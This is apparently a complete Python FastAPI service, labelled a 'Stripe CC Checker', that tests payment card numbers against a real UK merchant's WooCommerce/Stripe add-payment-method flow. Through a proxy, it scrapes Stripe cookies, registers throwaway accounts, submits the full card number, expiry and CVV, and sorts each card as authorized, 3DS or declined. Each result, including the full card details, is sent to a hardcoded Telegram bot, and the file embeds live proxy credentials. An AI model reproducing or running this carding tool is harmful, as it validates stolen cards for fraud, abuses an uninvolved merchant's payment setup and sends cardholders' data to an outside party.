import aiohttp
import asyncio
import random
import string
import uuid
from datetime import datetime
import os
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
import uvicorn
from playwright.async_api import async_playwright

app = FastAPI()

# --- Environment Variables ---
BOT_TOKEN = os.getenv("BOT_TOKEN", "8411567693:AAE7Yqpy4u9YZqL5DT3-hb0NZgLqTfnFEL0")
USER_ID = os.getenv("USER_ID", "1409419332")
PROXY_URL = os.getenv("PROXY_URL", "http://na.proxys5.net:6200")
PROXY_USERNAME = os.getenv("PROXY_USERNAME", "89565483-zone-custom")
PROXY_PASSWORD = os.getenv("PROXY_PASSWORD", "M5o5HIxR")

def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return "None"

def generate_random_email():
    domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "aol.com"]
    letters = string.ascii_lowercase
    username = "".join(random.choice(letters) for _ in range(10))
    domain = random.choice(domains)
    return f"{username}@{domain}"

def generate_uuid():
    return str(uuid.uuid4())

async def get_stripe_ids_and_cookies():
    """
    Launches a headless browser, navigates to the Stripe Elements page,
    captures Stripe cookies and the elements_session_config_id, then closes.
    Returns all relevant IDs and cookies for Stripe requests.
    """
    ids = {}
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        page = await browser.new_page()
        async def log_stripe_responses(response):
            if "stripe.com/v1/elements/sessions" in response.url:
                try:
                    body = await response.json()
                    ids["elements_session_config_id"] = body.get("config_id")
                except Exception:
                    pass
        page.on("response", log_stripe_responses)
        await page.goto("https://www.georgedaviesturf.co.uk/my-account/add-payment-method/")
        await page.wait_for_timeout(10000)
        cookies = await page.context.cookies()
        for cookie in cookies:
            if "stripe" in cookie["name"]:
                ids[cookie["name"]] = cookie["value"]
        await browser.close()
    for k in ["__stripe_mid", "__stripe_sid", "__stripe_muid"]:
        if k not in ids:
            ids[k] = str(uuid.uuid4())
    if "elements_session_config_id" not in ids:
        ids["elements_session_config_id"] = str(uuid.uuid4())
    return ids

async def make_request(
    session,
    url,
    method="POST",
    params=None,
    headers=None,
    data=None,
    json=None,
    proxy=None,
    proxy_auth=None,
    logs=None,
    step_name=""
):
    try:
        async with session.request(
            method,
            url,
            params=params,
            headers=headers,
            data=data,
            json=json,
            proxy=proxy,
            proxy_auth=proxy_auth,
        ) as response:
            resp_text = await response.text()
            if logs is not None:
                logs.append(f"Step: {step_name}\nURL: {url}\nStatus: {response.status}\nResponse:\n{resp_text}\n")
            return resp_text
    except (aiohttp.ClientProxyConnectionError, aiohttp.ClientConnectorError) as e:
        if logs is not None:
            logs.append(f"Step: {step_name}\nURL: {url}\nProxy Error: {e}\n")
        raise
    except Exception as e:
        if logs is not None:
            logs.append(f"Step: {step_name}\nURL: {url}\nError: {e}\n")
        raise

async def retry_request(*args, **kwargs):
    max_retries = 3
    for attempt in range(1, max_retries+1):
        try:
            return await make_request(*args, **kwargs)
        except (aiohttp.ClientProxyConnectionError, aiohttp.ClientConnectorError) as e:
            print(f"Proxy error on attempt {attempt}: {e} - Retrying...")
            await asyncio.sleep(2)
            continue
        except Exception as e:
            print(f"Non-proxy error: {e}")
            raise
    raise RuntimeError("All proxy retries failed for request.")

async def send_telegram_message(message):
    api_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": USER_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    async with aiohttp.ClientSession() as session:
        try:
            await session.post(api_url, data=payload)
        except Exception as e:
            print(f"Error sending Telegram notification: {e}")

async def get_bin_info(bin_number, logs=None):
    url = f"https://bins.antipublic.cc/bins/{bin_number}"
    async with aiohttp.ClientSession() as session:
        try:
            resp = await session.get(url)
            bin_info = await resp.text() if resp.status == 200 else "BIN info not found"
            if logs is not None:
                logs.append(f"Step: BIN Info\nURL: {url}\nStatus: {resp.status}\nResponse:\n{bin_info}\n")
            return bin_info
        except Exception as e:
            if logs is not None:
                logs.append(f"Step: BIN Info\nURL: {url}\nError: {e}\n")
            return f"BIN info error: {e}"

async def stripe_auth_logic(cc: str, mon: str, year: str, cvv: str):
    start_time = datetime.now()
    logs = []
    full_card_details = f"{cc}|{mon}|{year}|{cvv}"
    year_2digit = year[-2:]
    proxy_auth_obj = aiohttp.BasicAuth(PROXY_USERNAME, PROXY_PASSWORD) if PROXY_USERNAME and PROXY_PASSWORD else None
    connector = aiohttp.TCPConnector(ssl=False)

    ids = await get_stripe_ids_and_cookies()
    guid = ids['__stripe_mid']
    sid = ids['__stripe_sid']
    muid = ids['__stripe_muid']
    elements_session_config_id = ids['elements_session_config_id']
    client_session_id = str(uuid.uuid4())

    async with aiohttp.ClientSession(connector=connector) as my_session:
        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "priority": "u=0, i",
            "sec-ch-ua": '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
            "cookie": f"__stripe_mid={guid}; __stripe_sid={sid}; __stripe_muid={muid};"
        }
        
        try:
            req1_text = await retry_request(
                my_session,
                url="https://www.georgedaviesturf.co.uk/my-account",
                method="GET",
                headers=headers,
                proxy=PROXY_URL,
                proxy_auth=proxy_auth_obj,
                logs=logs,
                step_name="Get Register Nonce"
            )
            await asyncio.sleep(1)
            nonce = parseX(req1_text, 'name="woocommerce-register-nonce" value="', '"')
            if nonce == "None":
                logs.append("Failed to extract woocommerce-register-nonce\n")
                raise ValueError("Failed to extract woocommerce-register-nonce")

            headers2 = headers.copy()
            headers2.update({
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://www.georgedaviesturf.co.uk",
                "referer": "https://www.georgedaviesturf.co.uk/my-account",
            })
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            data2 = {
                "email": generate_random_email(),
                "wc_order_attribution_source_type": "typein",
                "wc_order_attribution_referrer": "(none)",
                "wc_order_attribution_utm_campaign": "(none)",
                "wc_order_attribution_utm_source": "(direct)",
                "wc_order_attribution_utm_medium": "(none)",
                "wc_order_attribution_utm_content": "(none)",
                "wc_order_attribution_utm_id": "(none)",
                "wc_order_attribution_utm_term": "(none)",
                "wc_order_attribution_utm_source_platform": "(none)",
                "wc_order_attribution_utm_creative_format": "(none)",
                "wc_order_attribution_utm_marketing_tactic": "(none)",
                "wc_order_attribution_session_entry": "https://www.georgedaviesturf.co.uk/my-account",
                "wc_order_attribution_session_start_time": f"{current_time}",
                "wc_order_attribution_session_pages": "1",
                "wc_order_attribution_session_count": "1",
                "wc_order_attribution_user_agent": headers["user-agent"],
                "woocommerce-register-nonce": nonce,
                "_wp_http_referer": "/my-account/",
                "register": "Register",
            }
            req2_text = await retry_request(
                my_session,
                "https://www.georgedaviesturf.co.uk/my-account/",
                headers=headers2,
                data=data2,
                proxy=PROXY_URL,
                proxy_auth=proxy_auth_obj,
                logs=logs,
                step_name="Register Random Account"
            )
            await asyncio.sleep(1)

            req3_text = await retry_request(
                my_session,
                url="https://www.georgedaviesturf.co.uk/my-account/add-payment-method/",
                method="GET",
                headers=headers,
                proxy=PROXY_URL,
                proxy_auth=proxy_auth_obj,
                logs=logs,
                step_name="Add Payment Method Nonce"
            )
            await asyncio.sleep(2)
            addpmnonce = parseX(req3_text, 'name="woocommerce-add-payment-method-nonce" value="', '"')
            rest_nonce = parseX(req3_text, '"createAndConfirmSetupIntentNonce":"', '"')
            if addpmnonce == "None" or rest_nonce == "None":
                logs.append("Failed to extract payment method nonces\n")
                raise ValueError("Failed to extract payment method nonces")

            headers4 = {
                "accept": "application/json",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "no-cache",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://js.stripe.com",
                "pragma": "no-cache",
                "priority": "u=1, i",
                "referer": "https://js.stripe.com/",
                "sec-ch-ua": headers["sec-ch-ua"],
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-site",
                "user-agent": headers["user-agent"],
                "cookie": f"__stripe_mid={guid}; __stripe_sid={sid}; __stripe_muid={muid};"
            }
            json_data4 = {
                "type": "card",
                "card[number]": cc,
                "card[cvc]": cvv,
                "card[exp_year]": year_2digit,
                "card[exp_month]": mon,
                "allow_redisplay": "unspecified",
                "billing_details[address][postal_code]": "99501",
                "billing_details[address][country]": "US",
                "pasted_fields": "number",
                "payment_user_agent": "stripe.js/04e5b47d27; stripe-js-v3/04e5b47d27; payment-element; deferred-intent",
                "referrer": "https://www.georgedaviesturf.co.uk",
                "time_on_page": "2362",
                "client_attribution_metadata[client_session_id]": client_session_id,
                "client_attribution_metadata[merchant_integration_source]": "elements",
                "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
                "client_attribution_metadata[merchant_integration_version]": "2021",
                "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
                "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
                "client_attribution_metadata[elements_session_config_id]": elements_session_config_id,
                "guid": guid,
                "muid": muid,
                "sid": sid,
                "key": "pk_live_51OCKXEAPMeRp4YIca4hWzwyYQnAllzcTDlBQ76zKfkErhZEyh5aOPCLixfOnAt1oV31EfTX2CGTu40JVnrLvQL7r0078s5MPx5",
                "_stripe_version": "2024-06-20",
            }
            req4_text = await retry_request(
                my_session,
                url="https://api.stripe.com/v1/payment_methods",
                headers=headers4,
                data=json_data4,
                proxy=PROXY_URL,
                proxy_auth=proxy_auth_obj,
                logs=logs,
                step_name="Stripe API Payment Method Creation"
            )
            pmid = parseX(req4_text, '"id": "', '"')
            if pmid == "None":
                logs.append("Failed to extract payment method ID from Stripe API response\n")
                raise ValueError("Failed to extract payment method ID from Stripe API response")

            headers5 = {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "no-cache",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": "https://www.georgedaviesturf.co.uk",
                "pragma": "no-cache",
                "priority": "u=1, i",
                "referer": "https://www.georgedaviesturf.co.uk/my-account/add-payment-method",
                "sec-ch-ua": headers["sec-ch-ua"],
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": headers["user-agent"],
                "x-requested-with": "XMLHttpRequest",
                "cookie": f"__stripe_mid={guid}; __stripe_sid={sid}; __stripe_muid={muid};"
            }
            data5 = {
                "action": "wc_stripe_create_and_confirm_setup_intent",
                "wc-stripe-payment-method": pmid,
                "wc-stripe-payment-type": "card",
                "_ajax_nonce": rest_nonce,
            }
            req5_text = await retry_request(
                my_session,
                url="https://www.georgedaviesturf.co.uk/wp-admin/admin-ajax.php",
                headers=headers5,
                data=data5,
                proxy=PROXY_URL,
                proxy_auth=proxy_auth_obj,
                logs=logs,
                step_name="Confirm Payment Method"
            )

            status = "Unknown"
            response_message = "Unknown response from checker"

            if "succeeded" in req5_text:
                bin_number = cc[:6]
                bin_info = await get_bin_info(bin_number, logs=logs)
                status = "Authorized"
                response_message = "Card Added"
            elif "requires_action" in req5_text:
                status = "Requires Action"
                response_message = "STRIPE 3DS2"
            elif "error" in req5_text:
                error_resp = parseX(req5_text, '"message":"', '"')
                status = "Declined"
                response_message = error_resp if error_resp != "None" else "Card declined by issuer"

            end_time = datetime.now()
            execution_time = (end_time - start_time).total_seconds()

            full_log = (
                f"✅ CC Checker Log\n"
                f"Card: {full_card_details}\n"
                f"Status: {status}\n"
                f"Response: {response_message}\n"
                f"Execution Time: {execution_time:.2f}s\n\n"
                f"--- Logs ---\n" +
                "\n".join(logs)
            )
            await send_telegram_message(full_log)

            return {
                "status": status,
                "response": response_message,
                "card_details": full_card_details,
                "execution_time": f"{execution_time:.2f}s",
                "logs": logs
            }

        except Exception as e:
            end_time = datetime.now()
            execution_time = (end_time - start_time).total_seconds()
            error_log = (
                f"❌ CC Checker Error\n"
                f"Card: {full_card_details}\n"
                f"Error: {str(e)}\n"
                f"Execution Time: {execution_time:.2f}s\n\n"
                f"--- Logs ---\n" +
                "\n".join(logs)
            )
            await send_telegram_message(error_log)
            return {
                "status": "Error",
                "response": f"Processing error: {str(e)}",
                "card_details": full_card_details,
                "execution_time": f"{execution_time:.2f}s",
                "logs": logs
            }

class CardDetails(BaseModel):
    cc: str
    mon: str
    year: str
    cvv: str

@app.post("/check-cc")
async def check_credit_card(card_details: CardDetails):
    """
    Endpoint to check credit card details using Stripe authentication flow.
    """
    result = await stripe_auth_logic(
        card_details.cc,
        card_details.mon,
        card_details.year,
        card_details.cvv
    )
    return result

@app.get("/health")
async def health_check():
    return {"status": "healthy", "service": "Stripe CC Checker"}

# Uncomment to run locally for testing:
# if __name__ == "__main__":
#     uvicorn.run(app, host="0.0.0.0", port=8000)
